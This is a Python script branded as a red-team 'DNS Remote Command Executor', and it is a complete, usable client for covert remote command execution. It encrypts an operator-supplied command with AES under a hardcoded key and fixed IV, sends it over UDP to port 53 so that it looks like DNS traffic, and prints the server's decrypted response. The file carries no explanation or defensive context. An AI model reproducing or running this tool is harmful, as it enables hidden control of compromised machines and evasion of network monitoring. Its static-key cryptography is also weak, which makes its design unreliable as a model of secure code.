import socket
import base64
import argparse
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

KEY = b'ACYBER-SECURITY-REDTEAM'.ljust(32, b'\0')
IV = b'0000000000000000'

def encrypt_data(data):
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data.encode()) + padder.finalize()

    cipher = Cipher(algorithms.AES(KEY), modes.CBC(IV), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    return base64.b64encode(encrypted_data).decode()

def decrypt_data(encrypted_data):
    cipher = Cipher(algorithms.AES(KEY), modes.CBC(IV), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(base64.b64decode(encrypted_data)) + decryptor.finalize()

    unpadder = padding.PKCS7(128).unpadder()
    original_data = unpadder.update(decrypted_data) + unpadder.finalize()
    return original_data.decode()

def send_request(command, server_ip, server_port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    command_message = "cmd:" + command
    encrypted_message = encrypt_data(command_message)
    client_socket.sendto(encrypted_message.encode(), (server_ip, server_port))
    data, addr = client_socket.recvfrom(1024)
    decoded_response = decrypt_data(data.decode())
    print(f"Response from server: {decoded_response}")

def main():
    parser = argparse.ArgumentParser(description="DNS Remote Command Executor")
    parser.add_argument('-ip', type=str, help='IP address of the server', default='192.168.20.147')
    parser.add_argument('-port', type=int, help='Port number of the server', default=53)
    parser.add_argument('-rce', type=str, help='Command to execute on the server', required=True)
    parser.add_argument('-help', action='help', help='Show this help message and exit')
    parser.add_argument('-about', action='version', version='DNS Remote Command Executor 1.0\nBy mrmtwoj@gmail.com\nacyber.ir\nGithub:mrmtwoj', help='About this tool')
    args = parser.parse_args()
    send_request(args.rce, args.ip, args.port)

if __name__ == "__main__":
    main()
